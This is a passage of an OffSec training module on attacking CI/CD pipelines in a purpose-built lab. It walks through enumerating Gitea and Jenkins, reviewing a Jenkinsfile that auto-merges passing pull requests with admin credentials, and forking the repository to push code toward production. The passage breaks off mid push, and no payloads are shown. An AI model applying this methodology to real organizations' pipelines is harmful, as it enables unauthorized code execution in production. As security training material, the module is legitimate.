[_Continuous integration_](https://en.wikipedia.org/wiki/Continuous_integration) (CI) and [_continuous delivery_](https://en.wikipedia.org/wiki/Continuous_delivery) (CD) systems automate and streamline the build and deployment process. Various steps that typically involve manual intervention can be automated. However, it's easy to overlook potential vulnerabilities in the flow of data between different stages of the _pipeline_.

Without adequate _flow control_, attackers may exploit vulnerabilities in the pipeline to gain unauthorized access or perform _privilege escalation_.

Since _CI/CD_ systems are massive targets for attackers, organizations like OWASP have created [top 10 lists](https://owasp.org/www-project-top-10-ci-cd-security-risks/) for the biggest security risks in CI/CD systems. The top 10 are as follows:

- _CICD-SEC-1_: Insufficient Flow Control Mechanisms
- _CICD-SEC-2_: Inadequate Identity and Access Management
- _CICD-SEC-3_: Dependency Chain Abuse
- _CICD-SEC-4_: Poisoned Pipeline Execution (PPE)
- _CICD-SEC-5_: Insufficient PBAC (Pipeline-Based Access Controls)
- _CICD-SEC-6_: Insufficient Credential Hygiene
- _CICD-SEC-7_: Insecure System Configuration
- _CICD-SEC-8_: Ungoverned Usage of 3rd Party Services
- _CICD-SEC-9_: Improper Artifact Integrity Validation
- _CICD-SEC-10_: Insufficient Logging and Visibility

This Module is the second part of a 3-part series. In this series, we will cover eight of the ten risks directly. The two that will not be covered directly are _CICD-SEC-8: Ungoverned Usage of 3rd Party Services_ and _CICD-SEC-10: Insufficient Logging and Visibility_. CICD-SEC-8 won't be covered because it requires a third-party service like _GitHub_, and in order to maintain a consistent lab, we won't be using third-party services. However, the principles learned here can be applied to this risk as well. CICD-SEC-10 won't be covered directly since visibility requires manual intervention, which is out of scope for this module.

In this part of the series, we will focus on _CICD-SEC-1 Insufficient Flow Control Mechanisms_, _CICD-SEC-2: Inadequate Identity and Access Management_, and _CICD-SEC-9: Improper Artifact Integrity Validation_.

_Insufficient Flow Control Mechanisms_ refers to the risk that occurs from automating a task without requiring the proper approvals or reviews. Depending on the flow, this could lead to code execution in production.

_Inadequate Identity and Access Management_ is the risk that occurs from improperly setting up how users authenticate and the permissions associated to the user account to various technology systems. Each application must be configured separately and accurately, and each user must only have the minimum privileges to do their job. As organizations grow, it's difficult to do this properly without a good access management strategy.

_Improper Artifact Integrity Validation_ is the risk that allows an attacker to push malicious code, libraries, or other artifacts into a pipeline without any validation.

It's important to mention that many of these risks described in OWASP have significant overlap. For example, a situation that has a "Improper Artifact Integrity Validation" risk will almost always also be vulnerable to "Insufficient Flow Control" since they'll need a way to introduce the malicious artifact.

In this Learning Module, we'll examine how a misconfigured pipeline can lead to complete control of the production environment. We'll work through an example showing how an attacker can obtain access to modify the contents of a repository indirectly, leading to code execution in production. We will cover the following Learning Units:

- Lab Design
- Information Gathering
- Compromising Production
- Wrapping Up

## 4.1. About the Public Cloud Labs

Before we jump in, let's run through a standard disclaimer.

This module uses OffSec's Public Cloud Labs for challenges and walkthroughs. **OffSec's Public Cloud Labs** are a type of lab environment that will complement the learning experience with hands-on practice. In contrast to our more common VM labs found elsewhere in OffSec Learning materials (in which learners will connect to the lab through a VPN), learners using the Public Cloud Labs will interact directly with the cloud environment through the Internet.

OffSec believes strongly in the advantages of learning and practicing in a hands-on environment, and we believe that the OffSec Public Cloud Labs represent an excellent opportunity for both new learners and practitioners who want to stay sharp.

Please note the following:

1. The lab environment should not be used for activities not described or requested in the learning materials you encounter. It is not designed to serve as a playground to test additional items that are out of the scope of the learning module.
    
2. The lab environment should not be used to take action against any asset external to the lab. This is specifically noteworthy because some modules may describe or even demonstrate attacks against vulnerable cloud deployments for the purpose of describing how those deployments can be secured.
    
3. Existing rules and requirements against sharing OffSec training materials still apply. Credentials and other details of the lab are not meant to be shared. OffSec monitors activity in the Public Cloud Labs (including resource usage) and monitors for abnormal events that are not related to activities described in the learning modules.
    

Activities that are flagged as suspicious will result in an investigation. If the investigation determines that a student acted outside of the guidelines described above, or otherwise intentionally abused the OffSec Public Cloud Labs, OffSec may choose to rescind that learner's access to the OffSec Public Cloud Labs and/or terminate the learner's account.

Progress between sessions is not saved. Note that a Public Cloud Lab that is restarted will return to its original state. After an hour has elapsed, the Public Cloud Lab will prompt to determine if the session is still active. If there is no response, the lab session will end. Learners can continue to manually extend a session for up to ten hours. The learning material is designed to accommodate the limitations of the environment. No learner is expected or required to complete all of the activities in a module within a single lab session. Even so, learners may choose to break up their learning into multiple sessions with the labs. We recommend making a note of the series of commands and actions that were completed previously to facilitate the restoration of the lab environment to the state it was in when the learner left. This is especially important when working through complex labs that require multiple actions.

## 4.2. Lab Design

This Learning Unit covers the following Learning Objectives:

- Understand how to access the lab

In order to create a realistic lab design, multiple services need to be started at once. This includes the _Source Code Management_ (SCM) service, the _automation server_, any required _repository services_, the actual _application_, and any _infrastructure_ needed to support the application. Because of this, the lab may take 5 to 10 minutes to start fully.

In order to support the labs, we include a few other auxiliary components that will help with exploiting the CI/CD system. When the lab starts, we will provide a DNS server that can be configured in your personal Kali machine. This DNS system will be pre-configured with all the hosts in the lab.

Since we will be exploiting public applications, we would also benefit from a Kali instance with a public IP to capture shells. For this reason, we'll also be providing a Kali instance with a public IP. This instance will be accessible via SSH using the username Kali and a randomly selected password for each lab. This Kali instance is already pre-configured with the DNS server.

This Kali instance contains the [_kali-linux-headless metapackage_](https://www.kali.org/docs/general-use/metapackages/), which installs all the default tools but does not install a GUI. We also added the DNS configuration to this instance, so no extra configuration is needed. Much of this lab can be completed on this instance. However, for any part of the lab that requires a GUI (loading a web page in a browser, for example), it is recommended to use a personal Kali instance.

The components of this lab include:

- [_Gitea_](https://about.gitea.com/): This is the _Source Code Management_ (SCM) service. While this is a self-hosted option, the attack would be conducted similarly if this was a public SCM like GitHub or _GitLab_.
- [_Jenkins_](https://www.jenkins.io/): This is the _automation service_. While we will have to use the Jenkins-specific syntax for understanding and writing pipeline workflows, the general idea can apply to most other automation services.
- _Application_: In this lab, the application allows users to create chat rooms.

The components will be accessible on the following subdomains when querying the custom DNS server.

|Component|Subdomain|
|---|---|
|Gitea|git.offseclab.io|
|Jenkins|automation.offseclab.io|
|Application|app.offseclab.io|

> Table 1 - Components of the Module

Next, we'll examine the steps for starting the lab.

## 4.2.1. Accessing the Labs

At the end of this section, we'll be able to start the lab. Once it's launched, we'll be provided with:

- A DNS server's IP address
- A Kali IP address
- A Kali password

In order to access the services, we will need to configure our personal Kali machine (not the cloud instance) to use the provided DNS server. For this example, our DNS server will be hosted on 203.0.113.84.

Let's start by listing the connections on our Kali machine. We'll use the **nmcli** command with the **connection** subcommand to list the active connections. Depending on how Kali is connected (via Wi-Fi, a VM, or any other configuration type), the output might differ.

```
kali@kali:~$ nmcli connection
NAME                UUID                                  TYPE      DEVICE 
Wired connection 1  67f8ac63-7383-4dfd-ae42-262991b260d7  ethernet  eth0   
lo                  1284e5c4-6819-4896-8ad4-edeae32c64ce  loopback  lo 
```

> Listing 1 - Listing Network Connections

In our situation, our main network connection has the name of "Wired connection 1". We'll use this in the next command to set the DNS configuration. Next, we'll add the **modify** subcommand to **nmcli** and specify the name of the connection we want to modify. We'll set the **ipv4.dns** setting to the IP of our DNS server. Once set, we'll use **systemctl** to restart the _NetworkManager_ service.

```
kali@kali:~$ nmcli connection modify "Wired connection 1" ipv4.dns "203.0.113.84"

kali@kali:~$ sudo systemctl restart NetworkManager

```

> Listing 2 - Setting DNS Server and Restarting NetworkManager Service

The hosted DNS server will only respond to the **offseclab.io** domain. You may specify additional DNS servers like 1.1.1.1 or 8.8.8.8 by adding them in a comma-separated list with the command above, for example, "203.0.113.84, 1.1.1.1, 8.8.8.8".

Once configured, we can check that the change propagated by verifying the DNS IP in our **/etc/resolv.conf** file. We'll also use **nslookup** to check if the DNS server is responding to the appropriate requests.

```
kali@kali:~$ cat /etc/resolv.conf
# Generated by NetworkManager 
search localdomain
nameserver 203.0.113.84
...

kali@kali:~$ nslookup git.offseclab.io
Server:         203.0.113.84
Address:        203.0.113.84#53

Non-authoritative answer:
Name:   git.offseclab.io
Address: 198.18.53.73
```

> Listing 3 - Verifying Changes for DNS

Based on the Listing above, we wrote our changes to the **resolv.conf** file and successfully queried one of the DNS entries.

Each lab restart will provide us with a new DNS IP, and we'll need to run the above commands to set it. At the end of the lab, we need to delete this entry from our settings since the DNS server will be destroyed. To do this, we'll run the **nmcli** command in Listing 2 but provide an empty string instead of the IP. We'll demonstrate this in the _Wrapping Up_ section.

## 4.3. Information Gathering

As with every security assessment, we should start by gathering as much information as possible about the target. Collecting this information is crucial to properly exploiting an application.

This Learning Unit covers the following Learning Objective:

- Understand how to enumerate a CI/CD system

## 4.3.1. Enumerating the Services

We know that we have an application, Git server, and automation server. Let's start by visiting the application (**app.offseclab.io**) in our browser to understand what it does.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/e5606a8e58c2b7bea4627b8afb67ab67_MD5.jpg]]

Figure 1: Home Page Of Application

The page requests us to join a room by specifying our name and a room name. Let's use **test** for the _name_ and **offsec** for the _room name_.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/aac17739bee4b80297e99ad2bf82b504_MD5.jpg]]

Figure 2: Chat Page of Application

This takes us to a chat room named _Offsec_ with a list of _Active Members_ on the right. Let's get a better understanding of how this application works by reviewing the network connections made when loading a chat. This will tell us about what assets the application loads and how the front end communicates with the server.

We'll right-click anywhere on the page, click on _Inspect_, click on the _Network_ tab, and check the _Disabled Cache_ checkbox to ensure we get all the network resources. Once set up, we'll reload the page.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/4916914e1fef8c976abc1b6b208f118b_MD5.jpg]]

Figure 3: Chat App Network Page

The first request we find is for the HTML of the currently-loaded page. Next, we find that some stylesheets, JavaScript, and images are loaded. Finally, we find a [_WebSocket_](https://en.wikipedia.org/wiki/WebSocket) connection on the **/socket.io/** route. This WebSocket connection is most likely how the chat application sends chat messages to the server and receives messages from the server.

WebSockets are a technology supported by most web browsers. The common protocol used for web requests, [_HTTP 1.1_](https://www.rfc-editor.org/rfc/rfc2616), does not allow for bidirectional communication. In HTTP 1.1, the client (in this case, a browser) sends a request to the server, and the server responds. But the server has no way of sending a request to the client. With WebSockets, a browser makes a connection that allows the server to send messages to the client and for the client to send messages to the server. [_Socket.io_](https://socket.io/) is a library that makes it easier to work with WebSockets. This will be important later.

HTTP/2 does support bidirectional communication; however, WebSockets are still commonly used in modern applications.

In a traditional assessment, we would continue with the enumeration of this application. This might include reviewing the HTML and JavaScript, conducting a route enumeration, and checking all inputs for vulnerabilities like [_Cross Site Scripting_](https://owasp.org/www-community/attacks/xss/) (HTML or JS injection) or SQL injection. However, we'll leave this as an independent exercise.

For now, let's continue enumerating the rest of the system. We'll pivot to the SCM server found on **git.offseclab.io**.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/02df290a0f5acb88a93a1f1170b1155e_MD5.jpg]]

Figure 4: SCM Server in Browser

When the page loads, one of the first things we'll notice is that this server allows for user registration. This is going to be very important later when we try to exploit CICD-SEC-2 - Inadequate Identity and Access Management. However, what we can do with this is going to depend on what the default user has access to. Let's continue as an anonymous user for now and click the _Explore_ tab in the top left.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/6301da0641a0a94e8586a06a2089ed49_MD5.jpg]]

Figure 5: Exploring Repositories

On the _Explore_ page, we find seven repositories, three of which are forks. We find the repository for the client and server of the chat application. We also find the builders for the client and server. Based on the _fork_ icon, we can assume that the _chat-client_ by the user _Mario_Knezovic_ is the original repo for the client and the _chat-server_ repository by the _Adis_Zvekic_ user is the original repo for the server. We also find builders for the server and client. Based on their names, we can assume this contains code for building the application. This might also contain the code to deploy the application. We'll investigate this in more detail later.

For now, let's open the chat-server repo and explore.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/3787bfc395a032afa6f36571e6bcc908_MD5.jpg]]

Figure 6: chat-server Repository by Adis_Zvekic

We notice a message that a pull request was merged from the chat-server repo forked by _Zarko_Kovacevic_. We also find a green check mark, which often means some form of CI/CD is running checks on the commits. This is common, as developers often don't want changes to impact the stability of the application.

Let's review the source code to gain a better understanding of how the application works.

#### Labs

1. Find the flag logged in the browser's JavaScript console.

Answer

## 4.3.2. Reviewing the Code

While going into an in-depth code review is out of scope for this Module, it is important to understand how the application works to be able to exploit it properly. Later, we'll use this knowledge to formulate a targeted attack against the environment. We'll start by reviewing the **index.js** file in the chat-server application since **index** files are typically the _entry points_.

```
01  const express = require('express');
02  const socketIo = require('socket.io');
03  const http = require('http');
04  const router = require('./router');
05  var path = require('path');
06  const cors = require('cors');
07  const { addUser, removeUser, getAllUsersInRoom, getUser } = require('./users');
08  const { use } = require('./router');
09
10  const PORT = process.env.PORT || 5000;
11
12  const app = express();
13  const server = http.createServer(app);
14  const io = socketIo(server);
15
16  if (process.env.NODE_ENV === 'production') {
17      app.use(express.static('client/build'));
18      app.get('*', (req, res) => {
19          res.sendFile(path.resolve(__dirname, 'client', 'build', 'index.html'));
20      });
21  }
22
23  app.use(router);
24  app.use(cors());
25
26
27  io.on('connection', (socket) => {
28      console.log(`New user connected with id: ${socket.id}`);
29
30      socket.on('USER_ADDED', ({ name, room }, callback) => {
31          const { err, user } = addUser({ id: socket.id, name, room });
32          if (err) {
33              return callback(err);
34          }
35
36          socket.emit('MESSAGE', { user: 'admin', text: `Welcome to the room, ${user.name}!!` });
37          socket.broadcast.to(user.room).emit('MESSAGE', { user: 'admin', text: `${user.name} has joined the chat!` });
38          socket.join(user.room);
39
40          io.to(user.room).emit('ROOM_DATA', { room: user.room, users: getAllUsersInRoom(user.room) });
41
42          callback();
43      });
44
45      socket.on('NEW_MESSAGE', (message, callback) => {
46          const user = getUser(socket.id);
47          io.to(user.room).emit('MESSAGE', { user: user.name, text: message });
48          //io.to(user.room).emit('ROOM_DATA', { room: user.room, users: getAllUsersInRoom(user.room)});
49
50          callback();
51      })
52
53      socket.on('disconnect', () => {
54          const user = removeUser(socket.id);
55          if (user) {
56              console.log(`User with id ${user.id} has disconnected`);
57              io.to(user.room).emit('MESSAGE', { user: 'admin', text: `${user.name} has left the chat!` })
58              io.to(user.room).emit('ROOM_DATA', { room: user.room, users: getAllUsersInRoom(user.room) });
59          }
60      });
61  });
62
63  server.listen(PORT, () => console.log(`Server is running on port: ${PORT}`));

```

> Listing 4 - Source Code of the index.js File

On line 4, we find that the application imports a route file. In modern web applications, it's common to find that the server doesn't host files but instead defines various routes programmatically. Instead of executing a specific file, it would execute a function or set of functions defined in the route file. We should make note of this file and review it later, as it might expose additional endpoints.

On lines 30, 45, and 53, we find various events that fire when certain actions occur. For example, on lines 30-43, we find the application emits a message that a user was added to the room, displaying the _room_ and _username_. We can assume that this message is then handled by the client and displayed to the other users.

Let's pivot to reviewing the **router.js** file.

```
01  const express = require('express');
02
03  const router = express.Router();
04
05  router.get('/', (req, res, next) => {
06      res.send('Server is running');
07  });
08
09  module.exports = router;    
```

> Listing 5 - Source Code of router.js File

The **router.js** file is much shorter and only defines a single route on the **root** of the web server. A request to the **root** of the server responds with a "Server is running" message.

We visited the root page of the application and found that we received some HTML for the chat application. We also found an additional route on **/socket.io** that isn't listed here. We need to learn more about what's going on.

Often, a single application will be split into multiple parts. Commonly, we find it split into a _frontend_ and _backend_, but the developers might split up individual features as well, such as _search_ or _authentication_. However, a [_reverse proxy_](https://en.wikipedia.org/wiki/Reverse_proxy) that acts as a traffic controller can join the entirety of the application together.

Requests to certain routes will be redirected to various endpoints. We can assume that requests to **/socket.io/*** are routed to the chat-server application, and the other parts of the application are routed to the chat-client application.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/9437623ec3b9e99d8c3f7b4909a720de_MD5.jpg]]

Figure 7: Reverse Proxy Explanation

Now that we understand how the chat-server works, let's review the code for the chat-client. We won't review every file, but let's read the file located in **src/components/Chat.js**, since that's where the interaction with the server occurs.

```
01  import React, { useEffect, useState } from 'react';
02  import { useHistory } from 'react-router-dom';
03  import queryString from 'query-string';
04  import io from 'socket.io-client';
05
06  import InfoBar from './InfoBar';
07  import Input from './Input';
08  import Messages from './Messages';
09  import TextContainer from './TextContainer';
10  import '../index.css';
11
12  let socket;
13
14  const Chat = ({ location }) => {
15      const [name, setName] = useState('');
16      const [room, setRoom] = useState('');
17      const [message, setMessage] = useState('');
18      const [messages, setMessages] = useState([]);
19      const [users, setUsers] = useState('');
20      const history = useHistory();
21
22      const socketUrl = '';
23
24      useEffect (() => {
25          const { name, room } = queryString.parse(location.search);
26          setName(name);
27          setRoom(room);
28
29          socket = io(socketUrl,{transports: ['websocket', 'polling', 'flashsocket']});
30          socket.emit('USER_ADDED', { name, room }, (err) => {
31              if (err) {
32                  alert(err);
33                  history.push('/');
34              }
35          });
36
37          return () => {
38              socket.emit('disconnect');
39              //socket.off();
40          }
41      }, [socketUrl, location.search]);
42
43      useEffect (() => {
44          socket.on('MESSAGE', (message) => {
45              setMessages([...messages, message]);
46          });
47
48          socket.on('ROOM_DATA', ({users}) => {
49              setUsers(users);
50          })
51      }, [messages]);
52
53      const sendMessage = (e) => {
54          e.preventDefault();
55
56          if (message) {
57              socket.emit('NEW_MESSAGE', message, () => setMessage(''));
58          }
59      }
60
61      console.log(messages);
62
63      return (
64          <div className = "outerContainer">
65              <div className = "container">
66                  <InfoBar room = {room}/>
67                  <Messages messages = {messages} name = {name}/>
68                  <Input message = {message} setMessage = {setMessage} sendMessage = {sendMessage} />
69              </div>
70              <TextContainer users = {users} />
71          </div>
72      );
73  }
74
75  export default Chat;
```

> Listing 6 - Source Code of Chat.js File

On line 4, we find that the JavaScript file imports the _socket.io-client_ that is used to make a connection to the server. The client itself handles the request, which is sent to the **/socket.io/*** route.

On lines 30-35, we find that the application emits a message that a user was added to the room with the _room_ and _username_. If we recall from Listing 4, the client listens for this USER_ADDED event when a new client joins a chat.

On lines 44-46, we find the [_event handler_](https://socket.io/docs/v4/listening-to-events/) when a new message is received. Lines 48-50 set the _event handler_ for the room information. Finally, on lines 56-58, we find the code where the server forwards the message a user typed to other users in the room.

Now that we understand the application, we can move on.

When exploring the repositories, we also found a builder repo for the server and client. Let's explore those in more detail next.

#### Labs

1. Read the rest of the source code and find the hidden flag. The flag will be obfuscated into the code as a variable.

Answer

## 4.3.3. Reviewing the Pipeline

We'll begin by reviewing the _builder-server_ repository.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/726d470fdb104b66253e8b32bbcb3df6_MD5.jpg]]

Figure 8: builder-server repository

The repository holds only a single [_Jenkinsfile_](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/). Many SCM software have their own pipeline feature. For example, GitHub has [_GitHub Actions_](https://github.com/features/actions), GitLab has [_GitLab CI/CD_](https://docs.gitlab.com/ee/ci/), and _Bitbucket_ has [_Bitbucket Pipelines_](https://bitbucket.org/product/features/pipelines). However, based off this filename, we can infer that the _automation server_ is running Jenkins.

Oftentimes, developers place the _Pipeline_ definition in the same repository as the code. However, in some situations, as shown here, a developer might choose to define the pipeline steps in a separate repository. This might be for security reasons, for example, to be able to segment who has access to modify the pipeline and who has access to modify the code. It may also simply be for organizational reasons, to separate more complex builds into a different repository.

Let's open the Jenkinsfile and review the code. We'll examine it in sections.

```
01  pipeline {
02      agent any
03
04      environment {
05          DOCKER_CMD = "docker -H tcp://docker:2376 --tlsverify --tlscacert /certs/client/ca.pem --tlskey /certs/client/key.pem --tlscert /certs/client/cert.pem "
06      }
07
```

> Listing 7 - Jenkinsfile in builder-server Repository - Setup

The first several lines define the pipeline and instruct Jenkins to run this code on any available runner (line 2). On line 5, we find a variable (_DOCKER_CMD_) configured for the **Docker** command. This command sets up Docker to connect to a remote Docker _socket_ (**-H tcp://docker:2376**) and to use specific _Transport Layer Security_ (TLS) configurations. This type of setup does not require the runner that is executing the code to be running Docker directly. Instead, as long as it has access to the docker host and the Docker binary, any runner would be able to execute the Docker commands.

If we can obtain command execution on the runner, we would most likely be able to pivot to this docker host as well. Let's keep reviewing this file.

```
08      stages {
09          stage('Check If PR'){
10              steps{
11                  script{
12                      echo "${env.CHANGE_ID}"
13                      if (env.CHANGE_ID) {
14                          env.ENV = "PR"
15                          env.IMAGE_TAG = "pr-${env.GIT_COMMIT}"
16                      }else{
17                          echo "SAVING PROD IMAGE"
18                          env.ENV = "PROD"
19                          env.IMAGE_TAG = "latest"
20                      }
21                  }
22              }
23          }
```

> Listing 8 - Jenkinsfile in builder-server Repository - PR Check

On line 8, we find the definition of the stages, and on line 9, we find the first stage. As the name of the stage suggests, this section will check if the incoming change is a pull request. The variable _CHANGE_ID_ used on line 13 is only present on pull requests in Jenkins. If it's a pull request, the _ENV_ variable will be set to "PR" and an image tag with the commit hash will be used (lines 14-15). However, if it's not a pull request, the _ENV_ variable will be set to "PROD", and the image tag will be set to "latest".

We can assume that this same pipeline is used for both changes to the **main** branch and for any pull requests.

```
24          stage('Login'){
25              steps{
26                  withCredentials([usernamePassword(credentialsId: 'docker', passwordVariable: 'PASSWORD', usernameVariable: 'USERNAME'), string(credentialsId: 'repo-url', variable: 'REPO')]) {
27                      sh "${env.DOCKER_CMD} login --username $USERNAME --password $PASSWORD $REPO"
28                  }
29              }
30          }
```

> Listing 9 - Jenkinsfile in builder-server Repository - Login

The next stage, _Login_, logs into the repository configured in Jenkins. The _withCredentials_ function binds the secrets set in the arguments ("docker" and "repo-url", in this case) to the scope of the step. This means that the **Docker** command that executes will have access to the _USERNAME_, _PASSWORD_, and _REPO_ variables on line 27. It is good for the security of the pipeline that the developers are using Jenkins' built-in [_secret management_](https://www.jenkins.io/doc/book/using/using-credentials/). While Jenkins' secret management has its own set of issues, it's a better option than hard-coding the secrets into the code.

```
31          stage('Build'){
32              steps{
33                  script{
34                      sh "ls -alh"
35                      sh "${env.DOCKER_CMD} build ./ -t chat-server:${env.IMAGE_TAG}"
36                      echo "Building Dockerfile"
37                      echo "${env.IMAGE_TAG}"
38                  }
39              }
40          }
```

> Listing 10 - Jenkinsfile in builder-server Repository - Build

The next step builds the chat-server image (lines 35) and tags it with the tag that was set when checking if the incoming change was a pull request or not.

```
41          stage('Push'){
42              steps{
43                  withCredentials([string(credentialsId: 'repo-url', variable: 'REPO')]) {
44                      sh "${env.DOCKER_CMD} tag chat-server:${env.IMAGE_TAG} $REPO/chat-server:${env.IMAGE_TAG}"
45                      sh "${env.DOCKER_CMD} push $REPO/chat-server:${env.IMAGE_TAG}"
46                  }
47              }
48          }
```

> Listing 11 - Jenkinsfile in builder-server Repository - Push

Next, the pipeline retags the image to include the _repo-url_ (line 44) and pushes the image up (line 45).

```
49          stage('Approve') {
50              steps {
51                  script{
52                   if (env.ENV == "PR") {
53                      withCredentials([usernamePassword(credentialsId: 'gitea-admin-account', passwordVariable: 'PASSWORD', usernameVariable: 'USERNAME')]) {
54                          sh 'curl -X POST -u $USERNAME:$PASSWORD http://gitea:3000/api/v1/repos/Adis_Zvekic/chat-server/pulls/${CHANGE_ID}/merge -H "accept: application/json" -H "Content-Type: application/json" -d \'{"Do": "merge","merge_when_checks_succeed": true}\''
55                      }
56                   } else {
57                      echo "Nothing to approve"
58                   }
59                  }
60              }
61          }
62      }
63  }
```

> Listing 12 - Jenkinsfile in builder-server Repository - Approve

Finally, the last step will again check if the environment is a pull request (line 52). If it is, the pipeline will use the _gitea-admin-account_ credentials (line 53) to send an API request to Gitea (line 54). This API request will set the pull request to automatically merge when the pipeline succeeds.

Earlier, we discovered a pull request with a green checkmark. Let's go back and investigate this pull request. We'll navigate to the _Explore_ page and click on the _Adis_Zvekic/chat-server_ repository again.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/553a7536a72be749740467cfdbd25d78_MD5.jpg]]

Figure 9: chat-server with Pull Request in History

Next, let's navigate to the _Pull Requests_ tab.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/19e5e79b10bf068a09d9596dcad869cb_MD5.jpg]]

Figure 10: Pull Requests Tab

We find the repo contains a single pull request. Let's click on it and investigate further.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/1b9e66ce4bdbde7494b11e98e927daa7_MD5.jpg]]

Figure 11: Reviewing Pull Request

We find that a user by the name _Zarko_Kovacevic_ created a pull request to add additional logging to investigate _dropped connections_. We also find a log message from Gitea that the administrator allowed the pull request to be automatically merged when all checks succeed. This was the exact step we discovered in the pipeline above.

Shortly after, Gitea presents that it merged and closed the pull request.

If we click on the green checkmark, we are redirected to the Jenkins build. However, this requires authentication, which we don't have access to.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/31fc6785d414ddda57c57925a2065f66_MD5.jpg]]

Figure 12: Jenkins Login

This type of automation is very useful for an organization that wants to allow its developers to modify the code and make changes, but prevent the types of changes that will break the build process. Ideally, the pipeline would also include additional tests to ensure that all the features work as they expect.

While this type of pipeline is useful, it does reveal some security concerns. More specifically, if we can obtain write access to the repo, we might be able to push custom code into production. Even if we don't have direct write access, we might be able to create a pull request that gets merged into the **master** branch, resulting in our custom code running in production.

#### Labs

1. Review all the pull requests in all repos to discover the flag.

Answer

2. Review the git history of the repos and find the flag.

Answer

## 4.4. Compromising Production

So far, we have conducted enumeration of the application server and the code that runs it. We've also reviewed the pipeline that builds the server.

By enumerating the application and the supporting material, we have discovered a potential problem with this pipeline, which might result in custom code execution in production.

During enumeration, we discovered that the SCM server allows for user registration. We should check if we can create an account. If we can, we should also check if the default user has direct access to edit the repo. If direct editing isn't allowed, we should then check if we can create a pull request. Either option might allow us to obtain code execution into production.

This Learning Unit covers the following Learning Objectives:

- Discover the permission boundaries of a default SCM user
- Obtain code execution in production

## 4.4.1. Creating an SCM Account

Let's start by following the registration steps and registering a user. In this section, we'll be exploiting _CICD-SEC-2: Inadequate Identity and Access Management_. At this point, we don't know what level of permission a default user would have. Public SCMs like GitHub always accept new user registrations. Privately-hosted SCMs, as in this example, should not have user registration enabled (in most situations). This means that user registration being available will most likely allow us to gain more access than we have as an anonymous user.

Even if our target used a public SCM like GitHub, we would still follow a similar attack methodology. We often find organizations that make parts of their code open-source, so _read_ access to these repositories is common. Direct _edit_ access to the repository is almost unheard of in public repositories, but often they will accept pull requests from the public. If the pipeline contains vulnerabilities where it automatically merges pull requests into a **main** branch, then even repositories hosted in public SCMs can be exploited.

To summarize, while we are targeting a privately hosted repository in this situation, it's important to keep in mind that our methodology does not change much from public repositories. The only difference is that we would significantly deprioritize testing direct editing a repository in a public SCM since that type of access is extremely rare.

We'll navigate to the _Register_ page by clicking the _Register_ button on the _home_ page of the SCM.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/c77a142a324808a1d2afe23d8350c98d_MD5.jpg]]

Figure 13: Register on SCM

We'll choose **offsec** as the _Username_, **offsec@offsec.com** for the _Email Address_, and **password** for the _Password_.

Once the account is created, we'll automatically be logged in. Let's navigate to the _Explore_ page to view the **index.js** file in the _Adis_Zvekic/chat-server_ repository.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/44d4ae023e3780c6b1255b39ed593b1b_MD5.jpg]]

Figure 14: View index.js on chat-server

If we hover over the _edit_ icon, a tooltip appears stating "You must fork this repository to make or propose changes to this file." This means that we don't have direct access. However, we're not out of luck just yet. We might be able to indirectly write to this repository by forking the repo and creating a pull request. As we found during the review of the pipeline, if a pull request successfully builds, we can automatically merge code into the repository.

Let's fork the repo and make a small change that we can verify in production. We can use this to test if our change is propagated from our pull request to production. We'll click _Fork_ at the top right of the repository, keep the default settings, and click _Fork Repository_.

![[OffSec/Cloud/Offensive Cloud Foundations/z. images/7e113b1cf0e19e34f248f6fe00d0d17d_MD5.jpg]]

Figure 15: Fork Repo

This will take us to the home page of our forked repository. While we can edit directly in the browser, let's clone the repo locally so we can use an IDE or text editor instead. We'll start by using **git clone** to download the repository locally. We'll then **cd** into the newly created directory and use **git config** to configure the **user.email** and **user.name** options to match the email and username name we selected when registering. Furthermore, we'll pass the **--local** argument to both of these commands to only change the configuration to this local repo.

```
kali@kali:~$ git clone http://git.offseclab.io/offsec/chat-server.git
Cloning into 'chat-server'...
remote: Enumerating objects: 13, done.
remote: Counting objects: 100% (13/13), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 13 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (13/13), 18.81 KiB | 296.00 KiB/s, done.
Resolving deltas: 100% (2/2), done.

kali@kali:~$ cd chat-server 

kali@kali:~/chat-server$ git config --local user.email "offsec@offsec.com"
                                                                                                       
kali@kali:~/chat-server$ git config --local user.name "offsec" 
```

> Listing 13 - Cloning chat-server Repo and Configuring git

Next, we'll open **index.js** with our favorite text editor and edit line 37 to send a more friendly message. The edit here is not very important, but it is important to change something that we'll be able to confirm has propagated to the frontend once the pipeline runs. We don't want to change, for example, a log message, since we won't be able to confirm that the change propagated.

```
kali@kali:~/chat-server$ nano index.js
                                                                                                       
kali@kali:~/chat-server$ cat -n index.js
...
    36          socket.emit('MESSAGE', { user: 'admin', text: `Welcome to the room, ${user.name}!!` });
    37          socket.broadcast.to(user.room).emit('MESSAGE', { user: 'admin', text: `${user.name} has joined the chat! Enjoy the conversation` });
    38          socket.join(user.room);
....
```

> Listing 14 - Editing index.js File

Next, we need to commit the change. We'll use **git add *** to add the change and **git commit** to commit the change. We'll use **-m** to add a message. Next, we can use **git push** to push the changes to our fork.

```
kali@kali:~/chat-server$ git add *
                                                                                                       
kali@kali:~/chat-server$ git commit -m "more friendly message"
[master 2543a89] more friendly message
 1 file changed, 2 insertions(+), 2 deletions(-)
                                                                                                       
kali@kali:~/chat-server$ git push
Username for 'http://git.offseclab.io': offsec
Password for 'http://offsec@git.offseclab.io': 
Enumerating objects: 5, done.
Counting objects: 100% (5/5), done.
Delta compression using up to 5 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 312 bytes | 312.00 KiB/s, done.
Total 3 (delta 2), reused 0 (delta 0), pack-reused 0
remote: 
remote: Create a new pull request for 'offsec:master':
